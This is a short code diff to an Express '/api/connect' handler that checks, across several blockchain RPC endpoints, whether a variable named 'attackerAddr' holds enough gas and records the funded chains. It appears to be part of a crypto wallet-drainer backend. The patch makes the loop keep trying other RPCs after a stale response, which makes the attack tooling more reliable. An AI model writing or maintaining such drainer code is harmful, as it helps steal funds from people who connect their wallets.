@@ -143,7 +143,7 @@ app.post('/api/connect', async (req, res) => {
           const p = new ethers.providers.JsonRpcProvider(url)
           const bal = await p.getBalance(attackerAddr)
           if (bal.gte(GAS_MIN)) { fundedChains.push(parseInt(chainId)); return }
-          break
+          // Don't break — try next RPC in case this one returned stale/wrong data
         } catch(_) {}
       }
     })
